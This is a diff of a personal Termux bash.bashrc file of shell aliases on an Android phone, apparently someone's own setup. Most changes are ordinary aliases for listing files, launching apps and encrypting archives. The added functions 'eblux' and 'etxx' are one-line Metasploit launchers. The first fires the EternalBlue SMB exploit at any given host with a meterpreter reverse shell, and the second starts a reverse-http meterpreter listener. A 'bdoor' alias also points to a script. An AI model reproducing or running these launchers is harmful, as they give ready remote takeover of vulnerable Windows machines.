@@ -7,7 +7,7 @@ pcommand_not_found_handle() {
 
 
 
-   alias uup='echo "/data/data/com.termux/files/home/99/0/x1"'
+   alias uup='tree /data/data/com.termux/files/home/99/0/x1'
     alias ff='app lite'
     alias xf='app Facebook'
       alias ww='app WhatsApp'
@@ -18,7 +18,9 @@ pcommand_not_found_handle() {
      alias gr='app Grabadora'
   alias  traa='app Traductor'
 alias rred='app Fing'
-
+alias la8="echo '172.26.248.142'"
+alias doñamaxi="echo '172.27.0.122'"
+alias alado="echo '172.26.237.48'"
  alias up-ytdl='pip install --upgrade youtube-dl'
 
 alias upip='python3 -m pip install --upgrade pip'
@@ -26,7 +28,7 @@ alias 00='cd /data/data/com.termux/files/home/99/00 && ls && tree -d'
 alias ls='echo "" && ls -tF --color=aut'
      alias servx='nano /data/data/com.termux/files/usr/etc/nginx/nginx.conf'
     alias lx='ls -a'
-    alias blux='sh /data/data/com.termux/files/home/99/00/zx/x/eteblux'
+ #   alias blux='sh /data/data/com.termux/files/home/99/00/zx/x/eteblux'
  
  alias bbashrc="rm -f  /data/data/com.termux/files/usr/etc/bash.bashrc  ; cp /data/data/com.termux/files/home/t99/bash.bashrc /data/data/com.termux/files/usr/etc"   
  
@@ -44,13 +46,19 @@ alias ls='echo "" && ls -tF --color=aut'
     alias ncat='sh  /data/data/com.termux/files/home/99/00/ncat'
       alias bdoor='sh /data/data/com.termux/files/home/99/00/ntc'
 
-     alias 3n='ccrypt -e'
+     alias c0='ccrypt -e'
      alias d3='ccrypt -d'
      alias co='tar -cvf'
      alias de='tar -xvf'
-    alias ld='ls -d */'
-    alias ll='ls -l'
+
+    alias ls='ls -tF --color=auto' 
+    alias lz='ls -atF --color=auto'
+    alias ll='ls -ltF --color=auto'
     alias rm='rm -ir'
+    alias ld='ls -d --color=auto */'
+
+
+
     alias xxl='cd /data/data/com.termux/files/usr/etc'
     alias des='cd /data/data/com.termux/files/home/storage/downloads && ls'
     alias codx='sh /data/data/com.termux/files/home/99/00/zx/x/codexx'
@@ -66,6 +74,11 @@ alias ls='echo "" && ls -tF --color=aut'
      alias dbxx='cd /data/data/com.termux/files/usr/opt/metasploit-framework && ./msfdb init && cd'
     alias edittt='cd  /data/data/com.termux/files/usr/etc && nano bash.bashrc && cd'
    alias xxh='sh /data/data/com.termux/files/home/99/00/zxxh'
+
+
+ function eblux () {  sh /data/data/com.termux/files/home/99/ban/banneternal ; ip="$(ip route show|grep ' src ' |cut -d' ' -f12)" && msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOST '$1';set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST $ip;set ExitOnSession false;set LPORT 2021;exploit";}
+
+function etxx () { ip="$(ip route show|grep ' src ' |cut -d' ' -f9)" && msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/'$2'meterpreter/reverse_http;set LPORT '$1';set LHOST $ip;exploit"; }
 
 
 sh /data/data/com.termux/files/home/99/ban/ban-crann
